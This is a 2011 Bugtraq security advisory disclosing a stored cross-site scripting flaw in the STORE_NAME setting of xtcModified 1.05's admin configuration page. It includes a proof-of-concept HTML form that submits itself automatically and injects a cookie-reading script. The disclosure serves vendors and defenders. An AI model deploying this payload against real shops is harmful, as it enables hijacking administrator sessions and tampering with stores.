
Date: Thu, 3 Mar 2011 12:50:27 +0100 (CET)
From: advisory@...ridge.ch
To: bugtraq@...urityfocus.com
Subject: HTB22866: XSS vulnerability in xtcModified

Vulnerability ID: HTB22866
Reference: http://www.htbridge.ch/advisory/xss_vulnerability_in_xtcmodified_3.html
Product: xtcModified
Vendor: xtcModified Team ( http://www.xtc-modified.org/ ) 
Vulnerable Version: 1.05 and probably prior versions
Vendor Notification: 17 February 2011 
Vulnerability Type: Stored XSS (Cross Site Scripting)
Risk level: Medium 
Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 

Vulnerability Details:
User can execute arbitrary JavaScript code within the vulnerable application.

The vulnerability exists due to failure in the "admin/configuration.php" script to properly sanitize user-supplied input in "STORE_NAME" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.

An attacker can use browser to exploit this vulnerability. The following PoC is available:

<form action="http://host/admin/configuration.php?gID=1&action=save" method="post" name="main">

<input type="hidden" name="STORE_NAME" value='My Store"><script>alert(document.cookie)</script>'>
<input type="hidden" name="STORE_OWNER" value="Owner">
<input type="hidden" name="STORE_OWNER_EMAIL_ADDRESS" value="email@...mple.com">
<input type="hidden" name="STORE_COUNTRY" value="81">
<input type="hidden" name="STORE_ZONE" value="80">
<input type="hidden" name="EXPECTED_PRODUCTS_SORT" value="desc">
<input type="hidden" name="EXPECTED_PRODUCTS_FIELD" value="date_expected">
<input type="hidden" name="DISPLAY_CART" value="true">
<input type="hidden" name="ADVANCED_SEARCH_DEFAULT_OPERATOR" value="and">
<input type="hidden" name="STORE_NAME_ADDRESS" value="address">
<input type="hidden" name="CURRENT_TEMPLATE" value="xtc5">
</form>
<script>
document.main.submit();
</script>



